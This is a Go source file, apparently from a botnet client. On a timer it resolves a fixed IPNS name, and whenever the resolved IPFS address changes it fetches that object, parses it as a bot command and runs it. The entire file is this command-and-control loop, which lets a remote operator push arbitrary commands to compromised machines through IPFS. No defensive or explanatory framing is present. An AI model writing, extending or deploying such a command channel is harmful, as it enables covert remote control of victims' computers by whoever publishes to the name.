package BotCommands

import (
	sh "github.com/ipfs/go-ipfs-api"
	"fmt"
	"time"
	"Constants"
)

func resolveIpns(shell *sh.Shell) string {
	ipfsAddress, err := shell.Resolve(Constants.IPNS_NAME)
	check(err)

	return ipfsAddress
}

func FetchCommand(ticker *time.Ticker, shell *sh.Shell) {
	lastAddress := ""

	for range ticker.C {
		fmt.Println("[fetch command] starting new ticker")

		fmt.Println("[fetch command] resolving ipfs name")
		c1 := make(chan string, 1)
		c1 <- resolveIpns(shell)

		select {
		case ipfsAddress := <-c1:
			fmt.Println("[fetch command] name resolved")

			if lastAddress == ipfsAddress {
				fmt.Println("[fetch command] without new command")

			} else {
				fmt.Println("[fetch command] we have new command")

				lastAddress = ipfsAddress

				obj, err := shell.ObjectGet(ipfsAddress)
				check(err)

				fmt.Println("[fetch command] new raw command: ", obj.Data)

				botCommand, err := ParseBotCommand(obj.Data)
				check(err)

				botCommand.RunCommand()
			}

		case <-time.After(time.Second * 30):
			fmt.Println("[fetch command] timeout")
		}
	}
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}
